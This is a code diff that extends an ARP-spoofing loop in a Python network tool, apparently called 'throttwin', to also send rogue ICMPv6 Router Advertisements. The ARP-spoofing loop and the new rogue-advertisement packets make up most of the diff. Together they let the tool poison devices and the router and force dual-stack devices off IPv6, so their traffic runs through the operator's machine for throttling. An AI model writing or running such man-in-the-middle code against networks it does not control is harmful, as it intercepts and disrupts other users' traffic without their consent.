@@ -8,46 +8,68 @@ log = logging.getLogger("throttwin")
 def arp_spoof_loop(interface, target_ip, target_mac, router_ip, router_mac,
                    my_mac, stop_event, status=None):
     """
-    Continuously send forged ARP replies to poison:
-      - target device: telling it our MAC is the router
-      - router: telling it our MAC is the target device
+    Continuously send forged ARP replies and ICMPv6 RA deprecation packets:
+      - IPv4: ARP-poisons target device and router so IPv4 traffic is captured.
+      - IPv6: Transmits ICMPv6 Router Advertisements with routerlifetime=0 so dual-stack
+        devices (iOS/iPhone, Android, Windows) invalidate the direct IPv6 default gateway
+        and fall back seamlessly to IPv4 (or route through our shaper).
     Uses Scapy on Windows via Npcap.
     """
     try:
         from scapy.all import Ether, ARP, sendp, conf as scapy_conf
-        from .network import get_scapy_interface
+        from scapy.layers.inet6 import IPv6, ICMPv6ND_RA, ICMPv6NDOptSrcLLAddr
+        from .network import get_scapy_interface, get_interface_ipv6_link_local
         npf_iface = get_scapy_interface(interface)
+        my_ll_ipv6 = get_interface_ipv6_link_local(interface)
 
-        # Packet: tell target "I am the router"
+        # Packet: tell target "I am the router" (IPv4)
         pkt_to_target = (
             Ether(dst=target_mac, src=my_mac) /
             ARP(op=2, pdst=target_ip, hwdst=target_mac,
                 psrc=router_ip, hwsrc=my_mac)
         )
-        # Packet: tell router "I am the target"
+        # Packet: tell router "I am the target" (IPv4)
         pkt_to_router = (
             Ether(dst=router_mac, src=my_mac) /
             ARP(op=2, pdst=router_ip, hwdst=router_mac,
                 psrc=target_ip, hwsrc=my_mac)
         )
 
-        log.info(f"ARP spoof started: {target_ip} ({target_mac})")
+        # ICMPv6 Rogue RA Packet (IPv6 routerlifetime=0 deprecation)
+        # Informs dual-stack iOS/Android devices that IPv6 gateway is deprecated
+        pkt_ra_unicast = (
+            Ether(dst=target_mac, src=my_mac) /
+            IPv6(src=my_ll_ipv6, dst="ff02::1") /
+            ICMPv6ND_RA(routerlifetime=0, chlim=64, prf=3) /
+            ICMPv6NDOptSrcLLAddr(lladdr=my_mac)
+        )
+        pkt_ra_multicast = (
+            Ether(dst="33:33:00:00:00:01", src=my_mac) /
+            IPv6(src=my_ll_ipv6, dst="ff02::1") /
+            ICMPv6ND_RA(routerlifetime=0, chlim=64, prf=3) /
+            ICMPv6NDOptSrcLLAddr(lladdr=my_mac)
+        )
+
+        log.info(f"Dual-stack spoof started: {target_ip} ({target_mac})")
 
         while not stop_event.is_set():
             try:
                 sendp(pkt_to_target, iface=npf_iface, verbose=0)
                 sendp(pkt_to_router, iface=npf_iface, verbose=0)
+                # Keep IPv6 suppressed on dual-stack devices so YouTube/Google route through IPv4 shaper
+                sendp(pkt_ra_unicast, iface=npf_iface, verbose=0)
+                sendp(pkt_ra_multicast, iface=npf_iface, verbose=0)
             except Exception as e:
-                log.debug(f"ARP send error for {target_ip} (interface may be reconnecting): {e}")
+                log.debug(f"Spoof send error for {target_ip} (interface may be reconnecting): {e}")
                 npf_iface = get_scapy_interface(interface)
             stop_event.wait(1.5)
 
     except Exception as e:
-        log.debug(f"ARP spoof loop exception for {target_ip}: {e}")
+        log.debug(f"Dual-stack spoof loop exception for {target_ip}: {e}")
     finally:
         # Restore ARP tables on exit
         _restore_arp(interface, target_ip, target_mac, router_ip, router_mac, my_mac)
-        log.info(f"ARP spoof stopped and restored: {target_ip}")
+        log.info(f"Dual-stack spoof stopped and restored: {target_ip}")
 
 
 def _restore_arp(interface, target_ip, target_mac, router_ip, router_mac, my_mac):
